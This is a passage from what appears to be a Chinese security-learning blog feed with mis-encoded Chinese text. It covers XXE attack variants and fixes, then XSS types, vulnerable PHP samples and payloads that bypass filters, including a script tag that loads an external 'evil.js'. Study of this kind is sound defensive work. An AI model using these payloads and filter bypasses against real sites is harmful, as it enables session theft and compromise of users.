&gt;]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure><p>å¦‚æœ XML è§£æå™¨å°è¯•ä½¿ç”¨<code>/dev/random</code>æ–‡ä»¶ä¸­çš„å†…å®¹æ¥æ›¿ä»£å®ä½“ï¼Œåˆ™æ­¤ç¤ºä¾‹ä¼šä½¿æœåŠ¡å™¨ï¼ˆä½¿ç”¨ UNIX ç³»ç»Ÿï¼‰å´©æºƒã€‚</p><h4 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h4><ul><li><p>pharåè®®ååºåˆ—åŒ–</p></li><li><p>åˆ©ç”¨EXCELè¿›è¡ŒXXEæ”»å‡»</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">è§£å‹xlsxæ–‡ä»¶ï¼Œåœ¨[Content_Types].xmlä¸­æ’å…¥payload</span><br><span class="line"></span><br><span class="line">æ‰“åŒ…ä¸ºxlsxï¼šzip -r xxe.xlsx *</span><br></pre></td></tr></table></figure></li><li><p>ä¸Šä¼ svgï¼Œdocxç­‰xmlæ ¼å¼çš„æ–‡ä»¶è¿›è¡Œæ”»å‡»</p></li><li><p>javaâ€“jaråè®®è§£å‹å‹ç¼©åŒ…</p></li></ul><h3 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h3><ul><li><p>æ’å…¥ç©ºæ ¼</p><p>å¯ä»¥åœ¨<code>&lt;?xml</code>æˆ–<code>&lt;!DOCTYPE</code>åæ’å…¥ä»»æ„æ•°é‡çš„ç©ºæ ¼</p><p><img src="/../images/image-20230605205020027.png" alt="image-20230605205020027"></p></li><li><p>ç¼–ç ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UTF-7</span><br><span class="line">UTF-16â€ŠBEï¼ŒUTF-16â€ŠLE</span><br><span class="line">UTF-32â€ŠBEã€UTF-32LEã€UTF-322143ã€UTF-323412</span><br><span class="line">EBCDIC</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat payload.xml | iconv -f utf-8 -t utf-7 &gt; payload.7.xml</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230606145117482.png" alt="image-20230606145117482"></p></li></ul><h3 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h3><p><a href="https://www.cnblogs.com/bmjoker/p/9614990.html">7.XXEinjectorï¼šä¸€æ¬¾åŠŸèƒ½å¼ºå¤§çš„è‡ªåŠ¨åŒ–XXEæ³¨å°„å·¥å…· - bmjoker - åšå®¢å›­ (cnblogs.com)</a></p><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><ul><li>ç¦ç”¨å¤–éƒ¨å®ä½“</li></ul><p>PHP: </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">true</span>); </span><br></pre></td></tr></table></figure><p>JAVA: </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SAXBuilder</span></span><br><span class="line"><span class="type">SAXBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SAXBuilder</span>();</span><br><span class="line">builder.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">builder.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">builder.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">builder.setFeature(<span class="string">&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// DocumentBuilder</span></span><br><span class="line"><span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span>  DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(<span class="literal">false</span>);</span><br><span class="line"><span class="type">DocumentBuilder</span> <span class="variable">documentBuilder</span> <span class="operator">=</span> dbf.newDocumentBuilder();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// SAXReader</span></span><br><span class="line"><span class="type">SAXReader</span> <span class="variable">saxReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SAXReader</span>();</span><br><span class="line">saxReader.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">saxReader.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">saxReader.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">saxReader.setFeature(<span class="string">&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// SAXTransformerFactory</span></span><br><span class="line"><span class="type">SAXTransformerFactory</span> <span class="variable">sf</span> <span class="operator">=</span> (SAXTransformerFactory) SAXTransformerFactory.newInstance();</span><br><span class="line">sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="string">&quot;&quot;</span>);</span><br><span class="line">sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// TransformerFactory</span></span><br><span class="line"><span class="type">TransformerFactory</span> <span class="variable">tf</span> <span class="operator">=</span> TransformerFactory.newInstance();      </span><br><span class="line">tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="string">&quot;&quot;</span>);</span><br><span class="line">tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Unmarshaller é»˜è®¤æ–¹æ³•ä¸å­˜åœ¨xxeæ¼æ´</span></span><br></pre></td></tr></table></figure><p> Pythonï¼š </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure><ul><li>è¿‡æ»¤ç”¨æˆ·æäº¤çš„ XML æ•°æ®</li></ul><p>å¦‚è¿‡æ»¤å…³é”®è¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE å’Œ&lt;!ENTITYï¼Œæˆ–è€… SYSTEM å’Œ PUBLIC</span><br></pre></td></tr></table></figure><h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1><p><a href="https://xz.aliyun.com/t/3357">https://xz.aliyun.com/t/3357</a></p><p><a href="https://r17a-17.github.io/2021/09/04/Java-XXE%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93">https://r17a-17.github.io/2021/09/04/Java-XXE%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93</a></p><p><a href="https://www.cnblogs.com/20175211lyz/p/11413335.html">https://www.cnblogs.com/20175211lyz/p/11413335.html</a></p><p><a href="https://xz.aliyun.com/t/6829#toc-4">https://xz.aliyun.com/t/6829#toc-4</a></p><p><strong>è¡¥å……</strong>ï¼š<a href="https://tttang.com/archive/1813/#toc__2">https://tttang.com/archive/1813/#toc__2</a></p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>XSS</title>
      <link href="/2023/06/01/Web%E5%AE%89%E5%85%A8%E4%B9%8BXSS/"/>
      <url>/2023/06/01/Web%E5%AE%89%E5%85%A8%E4%B9%8BXSS/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä¸»è¦åœ¨ <a href="https://xz.aliyun.com/t/9606">https://xz.aliyun.com/t/9606</a> åŸºç¡€ä¸Šè¿›è¡Œå­¦ä¹ </p><h1 id="æ¼æ´æ¦‚è¿°"><a href="#æ¼æ´æ¦‚è¿°" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h1><p> <strong>è·¨ç«™è„šæœ¬</strong>ï¼ˆè‹±è¯­ï¼šCross-site scriptingï¼Œé€šå¸¸ç®€ç§°ä¸ºï¼šXSSï¼‰æ˜¯ä¸€ç§ç½‘ç«™åº”ç”¨ç¨‹åºçš„å®‰å…¨æ¼æ´æ”»å‡»ã€‚è¿™ç±»æ¼æ´èƒ½å¤Ÿä½¿å¾—æ”»å‡»è€…åµŒå…¥æ¶æ„è„šæœ¬ä»£ç åˆ°æ­£å¸¸ç”¨æˆ·ä¼šè®¿é—®åˆ°çš„é¡µé¢ä¸­ï¼Œå½“æ­£å¸¸ç”¨æˆ·è®¿é—®è¯¥é¡µé¢æ—¶ï¼Œåˆ™å¯å¯¼è‡´åµŒå…¥çš„æ¶æ„è„šæœ¬ä»£ç çš„æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°æ¶æ„æ”»å‡»ç”¨æˆ·çš„ç›®çš„ã€‚</p><h1 id="äº§ç”ŸåŸå› "><a href="#äº§ç”ŸåŸå› " class="headerlink" title="äº§ç”ŸåŸå› "></a>äº§ç”ŸåŸå› </h1><ol><li>ä¸æ­£ç¡®çš„è¾“å…¥éªŒè¯ï¼šå½“ç½‘ç«™æ²¡æœ‰å¯¹ç”¨æˆ·æäº¤çš„æ•°æ®è¿›è¡Œå……åˆ†çš„éªŒè¯å’Œè¿‡æ»¤æ—¶ï¼Œæ¶æ„ç”¨æˆ·å¯ä»¥åœ¨è¾“å…¥ä¸­æ’å…¥æ¶æ„ä»£ç ã€‚è¿™äº›ä»£ç å¯èƒ½ä¼šè¢«å…¶ä»–ç”¨æˆ·æ‰§è¡Œï¼Œå¯¼è‡´XSSæ”»å‡»ã€‚</li><li>ä¸æ­£ç¡®çš„è¾“å‡ºç¼–ç ï¼šåœ¨å°†ç”¨æˆ·è¾“å…¥çš„æ•°æ®è¾“å‡ºåˆ°Webé¡µé¢ä¸Šæ—¶ï¼Œå¦‚æœæ²¡æœ‰è¿›è¡Œé€‚å½“çš„ç¼–ç å¤„ç†ï¼Œæµè§ˆå™¨å¯èƒ½ä¼šå°†å…¶ä¸­çš„ç‰¹æ®Šå­—ç¬¦è§£æä¸ºHTMLæˆ–JavaScriptä»£ç ï¼Œä»è€Œå¯¼è‡´æ¶æ„è„šæœ¬æ‰§è¡Œã€‚</li></ol><h1 id="å±å®³"><a href="#å±å®³" class="headerlink" title="å±å®³"></a>å±å®³</h1><ul><li>çªƒå–ç”¨æˆ·çš„ä¼šè¯ä»¤ç‰Œæˆ–Cookieï¼Œå¹¶ä»¥ç”¨æˆ·çš„èº«ä»½è¿›è¡Œéæ³•æ“ä½œ</li><li>æ„é€ é’“é±¼ç½‘ç«™</li><li>xssç›²æ‰“ï¼ŒæŒä¹…åŒ–æ§åˆ¶</li><li>å¯èƒ½é€ æˆè •è™«</li></ul><h1 id="ç±»å‹"><a href="#ç±»å‹" class="headerlink" title="ç±»å‹"></a>ç±»å‹</h1><p><img src="/../images/image-20230524205745342-1686840019396.png" alt="image-20230524205745342"></p><ul><li><p>åå°„å‹</p><p>ç”¨æˆ·è¾“å…¥ä»€ä¹ˆç½‘ç«™è¿”å›ä»€ä¹ˆï¼Œæ¼æ´æˆå‹ç‚¹åœ¨æœåŠ¡å™¨ç«¯ä»£ç è§£æå¼•æ“</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// ç›´æ¥å°†ç”¨æˆ·è¾“å…¥æ‹¼æ¥åˆ°htmlä¸­</span></span><br><span class="line">    <span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¸¸è§åœºæ™¯ï¼šå°†ç”¨æˆ·è¾“å…¥è¿›è¡Œå›æ˜¾çš„åœ°æ–¹ï¼Œæ”»å‡»è€…é€šå¸¸è¦å°†æ„é€ å¥½çš„urlå‘é€ç»™å—å®³è€…ï¼Œå—å®³è€…ç‚¹å‡»ä¹‹åæ‰ä¼šè§¦å‘ã€‚</p><p>æ¯”å¦‚æŸç«™ç‚¹æœç´¢åŠŸèƒ½å¤„å­˜åœ¨åå°„xssï¼Œæ”»å‡»è€…æ„é€ </p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">https://test.com/search.php?key=&lt;img%20src=1%20onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure><p>å½“ç”¨æˆ·ç‚¹å‡»è¯¥é“¾æ¥å°±ä¼šå‘ç”Ÿå¼¹çª—</p></li><li><p>å­˜å‚¨å‹</p><p>ç”¨æˆ·è¾“å…¥çš„æ•°æ®ä¼šå…ˆå­˜å‚¨åˆ°æ•°æ®åº“ä¸­ï¼Œåªè¦æŸ¥è¯¢åˆ°æ•°æ®åº“ä¸­çš„è„æ•°æ®ï¼Œè¿™äº›æ•°æ®å›æ˜¾åˆ°é¡µé¢å°±ä¼šè§¦å‘XSSï¼Œæ¼æ´æˆå‹ç‚¹åœ¨<strong>æ•°æ®åº“</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// è·å–ç”¨æˆ·è¾“å…¥</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é˜²å¾¡sqlæ³¨å…¥ï¼ˆä¹Ÿä¸å…¨ï¼Œ$nameå˜é‡æ²¡æœ‰è¿‡æ»¤ï¼‰</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>( <span class="variable">$message</span> );</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// æ²¡æœ‰è€ƒè™‘åˆ°å¯¹ XSS è¿›è¡Œè¿‡æ»¤,å°†xssæ•°æ®å­˜å…¥æ•°æ®åº“ä¸­</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="comment">// æŸ¥è¯¢ï¼Œæ‹¼æ¥ï¼Œè§¦å‘xss</span></span><br><span class="line">    xxxxï¼›</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¸¸è§åœºæ™¯ï¼šè¯„è®ºï¼Œè®¢å•ï¼Œä¸ªäººä¿¡æ¯ä¿®æ”¹ï¼ˆå¯ä»¥å‚è€ƒsqlä¸­çš„äºŒæ¬¡æ³¨å…¥ï¼‰</p></li><li><p>DOMå‹</p><p>ä¸æœåŠ¡å™¨æ— äº¤äº’ï¼Œæ¼æ´æˆå‹ç‚¹åœ¨**<code>javascript</code>æ–‡ä»¶è§£æç”¨æˆ·è¾“å…¥æ—¶**ï¼Œè§¦å‘ç‚¹åœ¨å®¢æˆ·ç«¯æ¸²æŸ“DOMæ—¶ã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  lang å˜é‡é€šè¿‡ document.location.hrefï¼ˆå½“å‰é¡µé¢çš„ URLï¼‰æ¥è·å–</span></span><br><span class="line"><span class="keyword">var</span> lang = document.location.href.<span class="title function_ invoke__">substring</span>(document.location.href.<span class="title function_ invoke__">indexOf</span>(<span class="string">&quot;default=&quot;</span>)+<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¹¶ä¸”æ²¡æœ‰ä»»ä½•è¿‡æ»¤å°±ç›´æ¥ URL è§£ç åè¾“å‡ºåœ¨äº† option æ ‡ç­¾ä¸­</span></span><br><span class="line">document.<span class="title function_ invoke__">write</span>(<span class="string">&quot;&lt;option value=&#x27;&quot;</span> + lang + <span class="string">&quot;&#x27;&gt;&quot;</span> + <span class="variable">$decodeURI</span>(lang) + <span class="string">&quot;&lt;/option&gt;&quot;</span>);</span><br></pre></td></tr></table></figure><p>å¸¸è§åœºæ™¯ï¼šéœ€è¦å®¡è®¡<code>javascript</code>ä»£ç ğŸ˜ª</p></li></ul><h1 id="å¦‚ä½•æ‰§è¡Œjavascript"><a href="#å¦‚ä½•æ‰§è¡Œjavascript" class="headerlink" title="å¦‚ä½•æ‰§è¡Œjavascript"></a>å¦‚ä½•æ‰§è¡Œjavascript</h1><ul><li>scriptæ ‡ç­¾</li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>éscriptæ ‡ç­¾</p><ul><li><p>äº‹ä»¶è§¦å‘</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;a href=<span class="string">&#x27;&#x27;</span> onclick=<span class="string">&#x27;alert(1)&#x27;</span>&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/jsref/dom-obj-event.html">HTML DOM äº‹ä»¶å¯¹è±¡ | èœé¸Ÿæ•™ç¨‹</a></p></li><li><p><code>javascript:</code>  </p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">  &lt;a href=<span class="string">&#x27;javascript:alert(1)&#x27;</span>&gt;&lt;/a&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(1);</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line">  &lt;form action=&quot;Javascript:alert(1)&quot;&gt;&lt;input type=submit&gt;</span><br><span class="line">  </span><br><span class="line">  //IE7ä»¥ä¸‹</span><br><span class="line">&lt;img src=javascript:alert(1)&gt;    </span><br></pre></td></tr></table></figure></li><li><p><code>script</code>æ ‡ç­¾çš„srcå±æ€§ï¼Œå¼•å…¥å¤–æ¥jsæ–‡ä»¶</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;http://xxx/evil.js&quot;</span>&gt;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h1 id="ç»•è¿‡å§¿åŠ¿"><a href="#ç»•è¿‡å§¿åŠ¿" class="headerlink" title="ç»•è¿‡å§¿åŠ¿"></a>ç»•è¿‡å§¿åŠ¿</h1><h2 id="ç»•è¿‡ç©ºæ ¼"><a href="#ç»•è¿‡ç©ºæ ¼" class="headerlink" title="ç»•è¿‡ç©ºæ ¼"></a>ç»•è¿‡ç©ºæ ¼</h2><p>å½“ç©ºæ ¼è¢«è¿‡æ»¤äº†æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ <code>/</code> æ¥ä»£æ›¿ç©ºæ ¼ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img/src=<span class="string">&quot;x&quot;</span>/onerror=<span class="title function_">alert</span>(<span class="number">1</span>);&gt;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img/src=<span class="string">&quot;x&quot;</span>onerror=<span class="title function_">alert</span>(<span class="number">1</span>);&gt;</span><br></pre></td></tr></table></figure><h2 id="ç»•è¿‡å¼•å·"><a href="#ç»•è¿‡å¼•å·" class="headerlink" title="ç»•è¿‡å¼•å·"></a>ç»•è¿‡å¼•å·</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="regexp">/xss/</span>)&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">`xss`</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://xxx/evil.js</span>&gt;</span></span> &lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="ç»•è¿‡æ‹¬å·"><a href="#ç»•è¿‡æ‹¬å·" class="headerlink" title="ç»•è¿‡æ‹¬å·"></a>ç»•è¿‡æ‹¬å·</h2><ul><li>throw</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=<span class="string">&quot;javascript:window.onerror=alert;throw 1&quot;</span>&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouseover</span>=<span class="string">&quot;javascript:window.onerror=alert;throw 1&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br></pre></td></tr></table></figure><ul><li>åå¼•å·</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">alert</span>(<span class="number">1</span>) == alert<span class="string">`1`</span></span><br></pre></td></tr></table></figure><h2 id="ç»•è¿‡å…³é”®å­—è¿‡æ»¤"><a href="#ç»•è¿‡å…³é”®å­—è¿‡æ»¤" class="headerlink" title="ç»•è¿‡å…³é”®å­—è¿‡æ»¤"></a>ç»•è¿‡å…³é”®å­—è¿‡æ»¤</h2><h3 id="å¤§å°å†™ç»•è¿‡"><a href="#å¤§å°å†™ç»•è¿‡" class="headerlink" title="å¤§å°å†™ç»•è¿‡"></a>å¤§å°å†™ç»•è¿‡</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;sCRiPt&gt;<span class="title function_">alert</span>(<span class="number">1</span>);&lt;/sCrIpT&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">ImG</span> <span class="attr">sRc</span>=<span class="string">x</span> <span class="attr">onerRor</span>=<span class="string">alert(1);</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="åŒå†™ç»•è¿‡"><a href="#åŒå†™ç»•è¿‡" class="headerlink" title="åŒå†™ç»•è¿‡"></a>åŒå†™ç»•è¿‡</h3><p>æœ‰äº›wafå¯èƒ½ä¼šåªæ›¿æ¢ä¸€æ¬¡ä¸”æ˜¯æ›¿æ¢ä¸ºç©ºï¼Œè¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥è€ƒè™‘åŒå†™å…³é”®å­—ç»•è¿‡</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;scrscriptipt&gt;<span class="title function_">alert</span>(<span class="number">1</span>);&lt;/scrscriptipt&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">imimgg</span> <span class="attr">srsrcc</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1);</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡"><a href="#å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡" class="headerlink" title="å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡"></a>å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡</h3><h4 id="åˆ©ç”¨eval-å‡½æ•°"><a href="#åˆ©ç”¨eval-å‡½æ•°" class="headerlink" title="åˆ©ç”¨eval()å‡½æ•°"></a>åˆ©ç”¨eval()å‡½æ•°</h4><p>ä¸PHPçš„eval()å‡½æ•°ç›¸åŒï¼ŒJavaScriptçš„eval()å‡½æ•°ä¹Ÿå¯ä»¥è®¡ç®— JavaScript å­—ç¬¦ä¸²ï¼Œå¹¶æŠŠå®ƒä½œä¸ºè„šæœ¬ä»£ç æ¥æ‰§è¡Œã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="string">&quot;a=&#x27;aler&#x27;;b=&#x27;t&#x27;;c=&#x27;(1)&#x27;;eval(a+b+c)&quot;</span>&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;a=`aler`;b=`t`;c=&#x27;(`xss`);&#x27;;eval(a+b+c)&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">// åœ¨jsä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨åå¼•å·ä»£æ›¿å•åŒå¼•å·</span></span><br></pre></td></tr></table></figure><h4 id="åˆ©ç”¨top"><a href="#åˆ©ç”¨top" class="headerlink" title="åˆ©ç”¨top"></a>åˆ©ç”¨top</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">top[<span class="string">&quot;al&quot;</span>+<span class="string">&quot;ert&quot;</span>](<span class="string">`xss`</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">top[<span class="string">&quot;al&quot;</span>+<span class="string">&quot;ert&quot;</span>](<span class="string">&quot;xss&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="æ ¹æ®è¾“å‡ºç‚¹é€‰æ‹©é—­åˆæ–¹å¼"><a href="#æ ¹æ®è¾“å‡ºç‚¹é€‰æ‹©é—­åˆæ–¹å¼" class="headerlink" title="æ ¹æ®è¾“å‡ºç‚¹é€‰æ‹©é—­åˆæ–¹å¼"></a>æ ¹æ®è¾“å‡ºç‚¹é€‰æ‹©é—­åˆæ–¹å¼</h2><p>WAFæœ€å¤§çš„é—®é¢˜ï¼Œåœ¨äºä¸çŸ¥é“è¾“å‡ºçš„ä½ç½®ï¼Œå¯¼è‡´æ”»å‡»è€…æ ¹æ®å…·ä½“ç¯å¢ƒä»¥åŠå…·ä½“è¾“å‡ºçš„æ ‡ç­¾ç±»å‹ä¾¿å¯ä»¥ç»•è¿‡ã€‚</p><h3 id="è¾“å‡ºåœ¨å±æ€§é‡Œ"><a href="#è¾“å‡ºåœ¨å±æ€§é‡Œ" class="headerlink" title="è¾“å‡ºåœ¨å±æ€§é‡Œ"></a>è¾“å‡ºåœ¨å±æ€§é‡Œ</h3><p>ä¾‹å¦‚è¾“å‡ºçš„ä½ç½®ä½äºvalueå±æ€§ä¸­ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;input value=<span class="string">&quot;[è¾“å‡º]&quot;</span> type=text&gt;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥é€‰æ‹©ç›´æ¥é—­åˆæ ‡ç­¾ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;img src=x onerror=alert(1);&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// è¾“å‡ºåå¦‚ä¸‹:</span></span><br><span class="line"><span class="string">&lt;input value=&quot;</span><span class="string">&quot;&gt;&lt;img src=x onerror=alert(1);&gt;&quot;</span> type=text&gt;</span><br></pre></td></tr></table></figure><p>å¦‚æœ <code>&lt; &gt;</code> è¢«è¿‡æ»¤çš„è¯å¯ä»¥æ¢æˆé€‰æ‹©ä½¿ç”¨äº‹ä»¶æ¥é—­åˆå±æ€§ï¼Œå¹¶å°†åé¢çš„å¼•å·æ³¨é‡Šæ‰æˆ–é—­åˆï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot; autofocus onfocus=alert(1)//</span></span><br><span class="line"><span class="string">&quot;</span> autofocus onfocus=<span class="title function_">alert</span>(<span class="number">1</span>) <span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// è¾“å‡ºåå¦‚ä¸‹:</span></span><br><span class="line"><span class="string">&lt;input value=&quot;</span><span class="string">&quot; autofocus onfocus=alert(1)//&quot;</span> type=text&gt;</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸€äº›ç‰¹æ®Šçš„åœºæ™¯ï¼Œå¦‚ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;input type=<span class="string">&quot;hidden&quot;</span> value=<span class="string">&quot;[è¾“å‡º]&quot;</span> /&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span 